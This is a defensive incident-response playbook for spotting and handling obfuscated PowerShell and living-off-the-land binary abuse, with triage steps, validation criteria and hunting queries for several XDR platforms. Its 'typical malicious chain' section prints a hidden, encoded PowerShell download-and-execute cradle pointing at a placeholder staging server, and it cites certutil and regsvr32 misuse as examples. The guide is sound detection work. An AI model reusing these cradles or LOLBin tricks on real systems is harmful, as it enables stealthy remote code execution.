# Playbook: Suspicious PowerShell & Living-Off-The-Land Binary (LOLBin) Execution

**MITRE ATT&CK:** T1059.001 (PowerShell), T1218 (System Binary Proxy Execution)

**Where this sits in the chain:** by this point an attacker typically already has credentials (playbook: LSASS dumping) and a foothold on at least one more host (playbook: PsExec/WMI lateral movement). This is the "now what" step — staging tooling, running recon, or setting up persistence using binaries that are already trusted and signed by Microsoft, specifically to avoid tripping simple allowlist/blocklist detections.

---

## 1. What the detection actually looks like

XDR platforms flag this category through behavior, not a single binary name, because the whole point of LOLBins is that the binary itself is legitimate:

- PowerShell launched with obfuscation flags: `-enc`/`-EncodedCommand`, `-nop`, `-w hidden`, `-ep bypass`
- A LOLBin known for proxy execution running with arguments that don't match its normal use — `mshta.exe` running inline JavaScript, `regsvr32.exe` with `/i:http...` (Squiblydoo), `certutil.exe -decode` or `-urlcache` pulling a remote file
- PowerShell making an outbound network connection directly (rather than through a browser or expected process)
- AMSI bypass attempts — process memory patched to disable the Antimalware Scan Interface before running a script
- Script block logging (Event ID 4104) capturing deobfuscated content that reveals a download-and-execute pattern

## 2. Telemetry sources to pull

| Source | What it gives you |
|---|---|
| Sysmon Event ID 1 | Process creation — full command line including encoded arguments |
| PowerShell Event ID 4104 | Script block logging — the actual (often deobfuscated) code that ran, not just the invocation line |
| PowerShell Event ID 4103 | Module logging — which cmdlets were invoked |
| Sysmon Event ID 3 | Network connections initiated directly by powershell.exe or a LOLBin |
| Sysmon Event ID 7 | Image/DLL load — catches AMSI-related DLL tampering |
| Windows Defender/AV logs | AMSI bypass or script-based malware detections, if not already suppressed |

## 3. Triage: is this worth escalating?

Ask, in order:

1. **Is this a known admin/automation script** (SCCM, scheduled maintenance, a documented deployment tool)? Check against your change calendar and known service accounts before anything else — a huge fraction of "suspicious PowerShell" alerts are legitimate automation with heavy-handed logging flagging normal behavior.
2. **Is the command line encoded or obfuscated?** `-enc` alone isn't automatically malicious (some legitimate tools encode to avoid quoting issues), but combined with `-w hidden` or `-nop`, it's a strong signal — legitimate admin scripts rarely need to hide their window or skip the profile.
3. **Decode the base64 before deciding anything.** This is the step people skip under time pressure and it's the one that actually tells you what happened.
4. **Is the LOLBin being used for its documented purpose, or clearly repurposed?** `certutil -decode file.txt file.exe` is not a certificate operation — that mismatch between binary and actual behavior is the tell for the entire LOLBin category.

If the decoded command reveals a download cradle (`IEX (New-Object Net.WebClient).DownloadString(...)` or similar), or a LOLBin is doing something outside its documented function, treat as validated and move to full investigation immediately.

## 4. Investigation: decoding and reading the payload

**Decoding a base64 PowerShell command (do this locally, not by pasting into an online decoder):**
```powershell
# On the analyst workstation, not the affected host
$encoded = "<the base64 string from the command line>"
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
```
PowerShell encodes with UTF-16LE by default — using the wrong encoding produces garbled output and is a common reason analysts think a script is "corrupted" when it's actually just decoded wrong.

Typical malicious chain:
```
powershell.exe -nop -w hidden -enc <base64>
  → decodes to: IEX (New-Object Net.WebClient).DownloadString('http://<staging-server>/payload.ps1')
  → payload.ps1 executes further recon or drops a second-stage binary
```

Command-line/script details that matter:
- `IEX` (Invoke-Expression) combined with a download cradle is the single most common malicious PowerShell pattern — it means "fetch code from the internet and run it immediately without ever touching disk"
- `-nop` (no profile) and `-w hidden` together strongly suggest the operator doesn't want the session visible or customized — legitimate interactive admin work rarely needs both
- AMSI bypass snippets typically involve reflection against `System.Management.Automation.AmsiUtils` — if you see this pattern in decoded script content, assume the attacker is specifically trying to blind script-based detection, which raises confidence this is not benign

## 5. Threat validation

Confirm true positive if **two or more** of the following are true:
- Decoded script content contains a download-and-execute pattern (`IEX`, `DownloadString`, `Invoke-WebRequest` piped directly into execution)
- Obfuscation flags are combined (`-enc` + `-w hidden` + `-nop`), not used individually
- A LOLBin is performing an action outside its documented function (certutil decoding an executable, regsvr32 loading a remote script)
- The destination of any outbound connection is not a known-good update/CDN endpoint

False positive indicators:
- Script matches a documented internal automation tool, and the source account/host is expected to run it
- Encoding is present but the decoded content is a standard internal deployment script with no network callout

## 6. Scope

Once validated:
- **Pull the full process tree forward from the PowerShell process** — what did the downloaded payload do next? This is usually where you find a second-stage tool, a scheduled task for persistence, or evidence of further credential access.
- **Check if the same command line or script hash appears on other hosts** — LOLBin techniques are often scripted and pushed identically across multiple machines in an automated attack.
- **Check for persistence artifacts** — scheduled tasks, registry Run keys, WMI event subscriptions — created around the same timestamp, since establishing persistence is the most common reason to run a LOLBin chain in the first place.

## 7. Containment

Priority order:
1. Kill the running PowerShell/LOLBin process and any child processes it spawned.
2. Block the staging server domain/IP at the network layer if one was identified in the decoded script.
3. Network-isolate the host if persistence artifacts or a second-stage payload were confirmed.
4. If credential access (LSASS dumping) or lateral movement (PsExec/WMI) show up in the same timeframe on the same host, treat this as one incident, not three — scope and contain against the full chain, not each technique separately.

## 8. Recovery

- Remove any persistence mechanism found (scheduled task, Run key, WMI subscription) — don't just kill the process, or it comes back on next reboot/logon.
- Re-image if a second-stage payload executed with unclear scope of what it did.
- If the same script/hash was pushed to multiple hosts, recovery needs to be coordinated across all of them at once, not sequentially — sequential cleanup gives the attacker time to notice and pivot.

## 9. Detection improvement

- Script block logging (Event ID 4104) is what makes any of this investigable — if it's not enabled fleet-wide, that's the single highest-value detection gap to flag, since encoded command lines alone are not enough to understand intent.
- Consider a detection rule specifically for the flag combination (`-enc` + `-w hidden`/`-nop` together) rather than alerting on any one flag individually, to reduce noise from legitimate automation while still catching the combination pattern attackers actually use.

## 10. XDR/EDR query reference

**Cortex XDR (XQL)**
```
dataset = xdr_data
| filter event_type = ENUM.PROCESS and action_process_image_name = "powershell.exe"
| filter action_process_image_command_line contains "-enc" or action_process_image_command_line contains "-EncodedCommand"
| filter action_process_image_command_line contains "-w hidden" or action_process_image_command_line contains "-windowstyle hidden"
| fields agent_hostname, actor_effective_username, action_process_image_command_line, _time
| sort desc _time
```

**Microsoft Defender XDR (KQL / Advanced Hunting)**
```kql
DeviceProcessEvents
| where FileName =~ "powershell.exe"
| where ProcessCommandLine has_any ("-enc", "-EncodedCommand")
| where ProcessCommandLine has_any ("-w hidden", "-windowstyle hidden", "-nop")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp desc
```
Pulling script block content directly (requires script block logging ingested):
```kql
DeviceEvents
| where ActionType == "PowerShellCommand"
| where AdditionalFields has_any ("DownloadString", "IEX", "Invoke-Expression")
| project Timestamp, DeviceName, AccountName, AdditionalFields
```

**CrowdStrike Falcon (Event Search / Falcon Query Language)**
```
event_simpleName=ProcessRollup2 FileName=powershell.exe
| CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*"
| table ComputerName, UserName, CommandLine, _time
```

**Splunk (if ingesting PowerShell operational logs)**
```spl
index=main source="*PowerShell%4Operational.evtx" EventCode=4104
| search Message="*DownloadString*" OR Message="*IEX*" OR Message="*Invoke-Expression*"
| table _time, ComputerName, Message
```

**Elastic (EQL)**
```eql
process where event.type == "start" and
  process.name == "powershell.exe" and
  process.command_line like "*-enc*" and
  process.command_line like "*hidden*"
```

## 11. Escalation and handoff notes

When writing this up for the incident ticket:
1. Always include the *decoded* command, not just the base64 blob — the raw encoded string tells the next reader nothing.
2. State explicitly whether this was found in isolation or alongside credential dumping/lateral movement activity on the same host or timeframe — chain context changes urgency and scope significantly.
3. List every host where the same script hash or command pattern appeared, even if only one was fully investigated in depth.
4. Note whether script block logging was enabled at time of incident — if not, flag it as a detection gap in the ticket itself, not just verbally, so it gets tracked.
